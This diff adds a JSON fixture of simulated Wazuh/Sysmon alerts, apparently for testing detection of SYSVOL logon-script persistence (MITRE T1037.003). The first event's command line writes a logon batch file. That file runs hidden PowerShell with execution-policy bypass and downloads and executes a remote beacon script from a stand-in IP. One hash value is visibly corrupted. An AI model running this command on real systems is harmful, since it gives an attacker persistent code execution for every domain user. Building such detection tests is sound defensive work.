@@ -1,0 +1,151 @@
+{
+  "_metadata": {
+    "attack_id": "T1037.003",
+    "variation": "001",
+    "name": "SYSVOL Network Logon Script Creation",
+    "description": "Creating a malicious .bat script in the SYSVOL\\scripts directory on the domain controller. This script will execute for all domain users at logon, providing persistent code execution across the domain",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - cmd.exe writing malicious bat to SYSVOL scripts",
+      "sequence": 1,
+      "timestamp": "2026-02-21T01:05:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: cmd.exe writing script to SYSVOL logon scripts directory",
+          "id": "100370",
+          "mitre": {
+            "id": [
+              "T1037.003"
+            ],
+            "tactic": [
+              "Persistence"
+            ],
+            "technique": [
+              "Network Logon Script"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708473900.180001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:05:00.000",
+              "processGuid": "{a1d4e7b2-8f3c-67b8-2100-000000001800}",
+              "processId": "5724",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c echo powershell.exe -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.40:8080/beacon.ps1')\" > \\\\DC01\\SYSVOL\\corp.local\\scripts\\logon_update.bat",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=b99d61d874728edc0918ca0eb10eab93d381e7367e377f6e9b0bbc8b83f16a38",
+              "parentProcessGuid": "{a1d4e7b2-8f10-67b8-2000-000000001800}",
+              "parentProcessId": "3952",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "powershell.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 11 - File created in SYSVOL scripts directory",
+      "sequence": 2,
+      "timestamp": "2026-02-21T01:05:01.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: File created in SYSVOL logon scripts directory",
+          "id": "100371",
+          "mitre": {
+            "id": [
+              "T1037.003"
+            ],
+            "tactic": [
+              "Persistence"
+            ],
+            "technique": [
+              "Network Logon Script"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708473901.180002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "11",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:05:01.000",
+              "processGuid": "{a1d4e7b2-8f3c-67b8-2100-000000001800}",
+              "processId": "5724",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "targetFilename": "C:\\Windows\\SYSVOL\\domain\\scripts\\logon_update.bat",
+              "creationUtcTime": "2026-02-21 01:05:01.000",
+              "user": "CORP\\Administrator",
+              "hashes": "SHA256=d7a95023fe0b76f6ae5b7e5c8b050be6e5572d1ef5f3e09e tried823cf9fc12b41"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
